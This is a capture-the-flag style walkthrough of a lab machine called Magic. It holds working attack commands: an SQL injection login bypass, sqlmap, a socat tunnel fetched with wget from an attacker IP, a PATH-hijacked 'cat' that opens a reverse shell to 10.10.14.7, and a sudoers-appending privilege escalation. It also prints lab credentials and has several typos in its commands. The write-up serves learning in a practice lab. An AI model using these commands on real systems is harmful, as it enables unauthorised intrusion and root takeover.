#### Enumeration
- Open Ports, port `22 and 80`
- `login.php` found in the webpage
- Enumerating dirs and files on the http port reveals `uploads.php, images dir`
- Buruteforcing the `301` images dir revealse `uploads` dir


#### Obtaining Shell
##### www-data Shell

- Bypass login with basic sql injection payload `' or 1 = 1 -- -` as user name and password
- Upload a php file gets error, play with magic bytes and upload successful
- Reverse shell via uploaded file

##### User Shell 

- Poking over, a database file is found with plain text creds, use it to obtain user
- mysql password obtained from the file, `/var/www/Magic/db.php5`
- Logging in to mysql to obtain the password of `thesus` and priv esc as thesus to obtain user

#### PrivEsc

- Look for setuid binaries
- `Systeminfo ` file utilises 4 binaries `lshw, free, cat, fdisk`
- Creating a binary with the same name and with path hijacking root shell can be obtained

#### Commands:

**Directory Enumeration**
```bash
# root enumeration
gobutser dir -u http://10.10.10.185 -w /usr/share/wordlists/dirubuster/directory-list-2.3-medium.txt -x php,txt -o root-dir.txt

# images enumeration
gobuster dir -u http://10.10.10.185/images/ -w /usr/share/wordlists/dirubuster/directory-list-2.3-medium.txt -x php,txt -o img-dir.txt
```

**Sql Injection**
```bash
# via sqlmap
# capture the login request via burp and save it as login.req
# theseus password obtained via sql injection
sqlmap -r login.req --level=5 --risk=3 --batch
# Manually on the web page
admin: ' or 1 = 1 -- - 
password: ' or 1 = 1 -- - 
```

**Port Forwarding**
```bash
# port forwarding the sql service to local machine
cd /tmp
wget http://10.10.14.52:8080/socat
chmod +x socat
# redirects port 3306 on localhost to port 5555 externally
# socat open the port 5555 in the magic machine and accepts connection only from 10.10.14.52
# the datas given by 10.10.14.5 to port 5555 are forwarded to 3306 which is mysql, the '&' at the last makes this command to run in the background
./socat TCP_LISTEN:5555, range = 10.10.14.52/32 TCP:localhost:3306 &
```

**MySql**
```bash
# After forwarding the service via socat
mysql -h 10.10.10.185 -P 5555 -u thesus -p iamkingtheseus
# after connection, enumerate the databases
show databases;
# select the magic database
use magic; 
# show the available tables in the database
show tables;
# show everything from the login table
select * from login;
# password for admin is obtained
admin: Th3s3usW4sK1ng

## This will be automatically obtained if sql map is used
# Use this password to escalate as theseus
```

**SUID Binaries**
```bash
# find via permissions
find / -perm -4000 -exec ls -l {} \; 2>/dev/null
```

**Path Exploitation**
```bash
# looking at the setuid binaries sysinfo is something odd, running it gives info
# obtain what it runs
strings /bin/sysinfo
# exploiting the path
# created a vulnerable cat binary which invokes reverse shell via socat
echo "./socat tcp-connect:10.10.14.7:5555 exec:/bin/sh,pty,stderr,setsid,sigint,sane" > cat
chmod +x cat
# export the pwd to path and execute sysinfo to obtain rootshell
export PATH=/tmp:$PATH
# running sysinfo will give us root shell as the path will look for cat in the /tmp dir first
```

**Path Exploitation 2**
```bash
# create a bash script to edit and add the theses user to execute all commands
echo "#!/bin/bash" > /tmp/cat
echo "/bin/echo 'theseus ALL = (ALL:ALL) ALL' >> /etc/sudoers" >> /tmp/cat
# export the path and run 
sudo su 
# enter the password for thesus root shell obtained
```
